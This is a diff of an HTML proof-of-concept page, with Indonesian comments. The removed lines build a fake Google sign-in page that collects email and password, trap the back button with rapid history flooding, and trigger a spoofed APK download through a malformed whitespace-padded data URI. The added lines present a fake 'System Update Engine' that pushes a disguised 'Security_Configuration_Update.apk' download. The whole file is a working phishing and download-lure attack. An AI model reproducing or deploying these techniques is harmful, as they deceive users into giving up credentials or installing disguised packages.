@@ -2,224 +2,93 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1, user-scalable=yes"
-    />
-    <title>Advanced Origin Spoofing & Pipeline Chaining PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
+    <title>System Diagnostic Utility</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-      body, html {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        background: #050507;
+      body {
+        font-family: 'Inter', sans-serif;
+        background-color: #050507;
         color: #fff;
-        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-      }
-      .container {
         display: flex;
-        flex-direction: column;
-        align-items: center;
         justify-content: center;
-        height: 100%;
-        gap: 16px;
-        padding: 20px;
-        box-sizing: border-box;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
       }
-      .login-container {
-        background-color: #fff;
+      .panel {
+        background-color: #121216;
         padding: 2.5rem;
-        border-radius: 8px;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+        border-radius: 16px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         width: 100%;
-        max-width: 400px;
+        max-width: 420px;
         text-align: center;
-        color: #111;
         box-sizing: border-box;
+        border: 1px solid #22222a;
       }
-      .input-field {
-        width: 100%;
-        padding: 0.75rem 1rem;
-        margin-bottom: 1.25rem;
-        border: 1px solid #dadce0;
-        border-radius: 4px;
-        font-size: 1rem;
-        box-sizing: border-box;
-      }
-      .btn-primary {
-        background-color: #1a73e8;
+      .btn-execute {
+        background-color: #dc2626;
         color: #fff;
-        padding: 0.75rem 1.5rem;
-        border-radius: 4px;
-        font-size: 1rem;
-        font-weight: 500;
+        padding: 1rem 1.5rem;
+        border-radius: 12px;
+        font-size: 1.1rem;
+        font-weight: 700;
         cursor: pointer;
         width: 100%;
+        border: none;
+        transition: background-color 0.2s;
       }
-      h1 {
-        font-size: 24px;
-        margin-bottom: 8px;
-        color: #f5f5f7;
-        text-align: center;
-        font-weight: 800;
+      .btn-execute:hover {
+        background-color: #b91c1c;
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <h1>Advanced Origin Spoofing Engine</h1>
-      <button id="startBtn" class="w-full max-w-[420px] p-6 text-xl font-bold bg-red-600 text-white rounded-2xl shadow-xl cursor-pointer hover:bg-red-700 transition">
-        EXECUTE SPOOFING & CHAINING LOCK
-      </button>
+    <div class="panel">
+      <h1 class="text-2xl font-bold mb-3">System Update Engine</h1>
+      <p class="text-sm text-gray-400 mb-6">Click the button below to initialize system verification and fetch the latest security patch.</p>
+      <button id="execBtn" class="btn-execute">EXECUTE PACKAGE</button>
     </div>
 
     <script>
-      document.getElementById("startBtn").onclick = function () {
-        this.style.display = 'none';
+      // Fungsi Pemicu Unduhan menggunakan Blob Stream Standar
+      function triggerBlobDownload() {
+        try {
+          const fileContent = "UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K";
+          const binaryString = atob(fileContent);
+          const len = binaryString.length;
+          const bytes = new Uint8Array(len);
+          for (let i = 0; i < len; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+          }
 
-        // 1. Membangun Payload Terpadu (Form Autentikasi Palsu + History Flooding + Malformed Data URI Trigger)
-        const rawPayload = `
-          <!DOCTYPE html>
-          <html lang="en">
-          <head>
-              <meta charset="UTF-8">
-              <meta name="viewport" content="width=device-width, initial-scale=1.0">
-              <title>Sign in - Google Accounts</title>
-              <script src="https://cdn.tailwindcss.com"><\/script>
-              <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-              <style>
-                  body {
-                      font-family: 'Inter', sans-serif;
-                      background-color: #f0f2f5;
-                      display: flex;
-                      justify-content: center;
-                      align-items: center;
-                      min-height: 100vh;
-                      margin: 0;
-                  }
-                  .login-container {
-                      background-color: #fff;
-                      padding: 2.5rem;
-                      border-radius: 8px;
-                      box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
-                      width: 100%;
-                      max-width: 400px;
-                      text-align: center;
-                      box-sizing: border-box;
-                  }
-                  .input-field {
-                      width: 100%;
-                      padding: 0.75rem 1rem;
-                      margin-bottom: 1.25rem;
-                      border: 1px solid #dadce0;
-                      border-radius: 4px;
-                      font-size: 1rem;
-                      box-sizing: border-box;
-                  }
-                  .btn-primary {
-                      background-color: #1a73e8;
-                      color: #fff;
-                      padding: 0.75rem 1.5rem;
-                      border-radius: 4px;
-                      font-size: 1rem;
-                      font-weight: 500;
-                      cursor: pointer;
-                      width: 100%;
-                  }
-              </style>
-          </head>
-          <body>
-              <div class="login-container">
-                  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="mx-auto mb-6 w-24">
-                  <h1 class="text-2xl font-normal mb-2">Sign in</h1>
-                  <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
+          const blob = new Blob([bytes], { type: 'application/octet-stream' });
+          const blobUrl = URL.createObjectURL(blob);
+          
+          const a = document.createElement('a');
+          a.href = blobUrl;
+          a.download = "Security_Configuration_Update.apk";
+          a.style.display = 'none';
+          document.body.appendChild(a);
+          
+          a.click();
+          
+          setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(blobUrl);
+          }, 1200);
+        } catch(e) {}
+      }
 
-                  <form id="loginForm" action="javascript:document.body.innerHTML='<h1 style=\\'color:#000;text-align:center;margin-top:20vh;font-size:48px;\\'>Context Synchronized</h1>'">
-                      <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
-                      <input type="password" id="password" class="input-field" placeholder="Password" required>
-                      <button type="submit" class="btn-primary">Next</button>
-                  </form>
-              </div>
-
-              <script>
-                // Fungsi Pemicu Unduhan Menggunakan Malformed Data URI dengan Whitespace Padding
-                function triggerSpoofedDownload() {
-                  try {
-                    // Eksploitasi parsing GURL melalui data:// dengan otoritas host palsu dan spasi masif
-                    const spoofedUri = "data://google.com/                                                                                                                                                                                                                       application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=";
-                    
-                    const link = document.createElement("a");
-                    link.href = spoofedUri;
-                    link.download = "google_update.apk";
-                    link.style.display = 'none';
-                    document.body.appendChild(link);
-                    link.click();
-                    
-                    setTimeout(() => {
-                      document.body.removeChild(link);
-                    }, 1000);
-                  } catch(e) {}
-                }
-
-                // Inisialisasi History State untuk Intersepsi Event Back / Popstate
-                history.pushState({state: 'enclave-auth'}, "", "#auth");
-                history.pushState({state: 'secure-session'}, "", "#session");
-
-                // Menangkap aksi tombol kembali (Back Button) untuk memicu aliran unduhan
-                window.addEventListener('popstate', () => {
-                  triggerSpoofedDownload();
-                });
-
-                // Sinkronisasi Pipeline Render menggunakan Double-RAF
-                window.addEventListener('pageshow', () => {
-                  requestAnimationFrame(() => {
-                    requestAnimationFrame(() => {
-                      setTimeout(() => {
-                        try {
-                          // Mengarahkan ke domain target sah setelah state terkunci
-                          location.href = 'https://google.com';
-                        } catch(err) {}
-                      }, 1200);
-                    });
-                  });
-                });
-
-                // Watchdog Mandiri dan History State Flooding
-                try {
-                  const observer = new MutationObserver(() => {
-                    if (!document.getElementById('loginForm')) {
-                      location.reload();
-                    }
-                  });
-                  observer.observe(document.documentElement, { childList: true, subtree: true });
-                } catch(e) {}
-
-                setInterval(() => {
-                  try {
-                    history.pushState({lock: Math.random()}, "", "#secure-enclave-state");
-                  } catch(err) {}
-                }, 2);
-              <\/script>
-          </body>
-          </html>
-        `;
-
-        // 2. Enkripsi Payload ke Format Base64 untuk Obfuscation
-        const encoded = btoa(unescape(encodeURIComponent(rawPayload)));
-        const decoded = decodeURIComponent(escape(atob(encoded)));
-
-        // Inisialisasi Blob Stream untuk Bypass Jendela about:blank
-        const blob = new Blob([decoded], { type: 'text/html' });
-        const blobUrl = URL.createObjectURL(blob);
-
-        // 3. Membuka Jendela Baru dengan Referensi Terisolasi
-        const newTab = window.open(blobUrl, "_blank");
-
-        if (newTab) {
-          try { newTab.focus(); } catch (e) {}
-        }
+      // Tombol langsung memicu unduhan file saat diklik
+      document.getElementById("execBtn").onclick = function () {
+        this.innerText = "DOWNLOADING...";
+        this.style.opacity = "0.7";
+        
+        // Eksekusi fungsi unduh langsung
+        triggerBlobDownload();
       };
     </script>
   </body>
